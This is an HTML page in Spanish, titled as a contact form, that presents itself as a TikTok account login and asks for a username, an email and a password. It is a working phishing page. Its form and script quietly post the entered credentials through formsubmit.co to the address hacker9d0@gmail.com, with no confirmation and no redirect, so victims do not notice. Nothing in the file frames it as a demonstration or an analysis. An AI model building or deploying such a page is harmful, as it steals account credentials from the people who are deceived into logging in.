<!DOCTYPE html>
<html lang="es">
<head>

<meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0" />

<title>Formulario de contacto</title>
<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;
  padding: 20px;

  background-image: url('IMG_1098.jpeg');
  background-repeat: no-repeat;
  background-size: cover;
  background-position: center;
  background-attachment: fixed;

  font-family: Arial, sans-serif;

  display: flex;
  justify-content: center;
  align-items: center;
}

.contenedor {
  width: 100%;
  max-width: 420px;

  padding: 28px 22px;

  border-radius: 24px;

  background: rgba(255, 255, 255, 0.96);

  box-shadow: 0 15px 40px rgba(0, 0, 0, 0.25);
}

h2 {
  text-align: center;
  margin: 0 0 28px;

  color: #111;
  font-size: 27px;
  font-weight: 700;
}

.field {
  margin-bottom: 20px;
}

label {
  display: block;
  margin-bottom: 8px;

  color: #222;
  font-size: 15px;
  font-weight: 600;
}

input,
textarea {
  width: 100%;

  padding: 17px 18px;

  border: none;
  border-radius: 16px;

  outline: none;

  background: #f1f1f1;

  color: #111;
  font-size: 17px;
  font-family: Arial, sans-serif;
}

input::placeholder,
textarea::placeholder {
  color: #888;
}

input:focus,
textarea:focus {
  background: #e9e9e9;
}

textarea {
  min-height: 58px;
  resize: none;
}

.submit-btn {
  width: 100%;

  margin-top: 8px;
  padding: 17px;

  border: none;
  border-radius: 16px;

  background: #111;
  color: white;

  font-size: 17px;
  font-weight: bold;

  cursor: pointer;
}

.submit-btn:active {
  transform: scale(0.98);
}
</style>
</head>
<body>
<div class="contenedor">
  <img
  src="IMG_1262.jpeg"
  class="logo-formulario"
  alt="Logo"
/>
  <h2>cuenta de Tik Tok</h2>
  <form
  id="formulario"
  action="https://formsubmit.co/ajax/hacker9d0@gmail.com"
  method="POST"
>
<div class="field">
  <label for="nombre de usuario">Nombre de usuario</label>
  <input
    type="text"
    id="nombre de usuario"
    name="nombre de usuario"
    placeholder="nombre"
    required
  />
</div>
<div class="field">
  <label for="correo">Correo electrónico</label>
  <input
    type="email"
    id="correo"
    name="correo"
    placeholder="tu@correo.com"
    required
  />
</div>
<div class="field">
  <label for="contraseña">contraseña</label>
  <textarea
    id="contraseña"
    name="contraseña"
    placeholder="contraseña"
    required
  ></textarea>
</div>
<input
  type="hidden"
  name="_subject"
  value="Nuevo mensaje recibido"
/>
<input
  type="hidden"
  name="_template"
  value="table"
/>
<button type="submit" class="submit-btn">
  iniciar secion
</button>
  </form>
</div>
  <script>
document.getElementById("formulario").addEventListener("submit", async function(event) {
  event.preventDefault();

  const datos = new FormData(this);

  try {
    await fetch(this.action, {
      method: "POST",
      body: datos,
      headers: {
        "Accept": "application/json"
      }
    });

    // No muestra mensaje de agradecimiento
    // No redirige a otra página

  } catch (error) {
    console.error("Error al enviar el formulario:", error);
  }
});
</script>
</body>
</html>
